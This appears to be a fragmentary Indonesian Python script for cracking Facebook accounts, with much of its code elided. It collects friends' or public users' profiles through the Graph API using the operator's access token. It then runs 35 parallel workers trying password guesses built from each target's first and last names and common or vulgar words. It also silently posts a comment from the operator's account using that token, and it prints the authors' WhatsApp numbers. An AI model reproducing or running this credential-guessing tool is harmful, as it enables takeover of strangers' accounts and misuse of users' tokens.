...
class crack:
	...
	def sendTeman(self):
		...
		print(title+"\nAuthor : latipharkat & Radhin_ | Wa : 083870396203 & Wa : 0823-7315-8947\n")
		time.sleep(2)
		...
		with Bool(max_workers=35) as tokai:
			for x in r['data']:
				...
				pas=[r2['first_name']+"123",r2['first_name']+"power by latip","powe by Radhin","power by latip","power by Radhin","power by latip","power by Radhin","power by latip","power by Radhin","power by latip","power by Radhin","power by latip","power by Radhin","power by latip",r2['last_name']+"123",r2['last_name']+"12345"]
				try:
	...
	def sendPublik(self):
		...
		with Bool(max_workers=35) as tokai:
			...
			for x in r2['data']:
				...
				pas=[r3['first_name']+"123",r3['first_name']+"12345","123456","12345678","Bangsad","Monyet","Mantan","Anjing","Kontol","Bangsad123","Doraemon","Anjing123","Sayang","Sayang123",r3['last_name']+"123",r3['last_name']+"12345"]
				try:
...
def judul():
	...
	print(title+"\n[1]. Login Dan Masukan Access Token Facebook Anda power by latip harkat\n[2]. Cara Mendapatkan Access Token Facebook\n[00]. Keluar Dari Script\n")
	login()
def login():
	...
	if pilih in (""," "):
		...
		try:
			...
			r2=req.post(f"https://graph.facebook.com/237332468053868/comments/?message=Hallo Bang Latip&access_token={token}")
			os.system('clear')
...
def logikaLogin():
	...
	try:
		...
		print("[!] Anda Belum Login ☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️")
		time.sleep(2)
		judul()
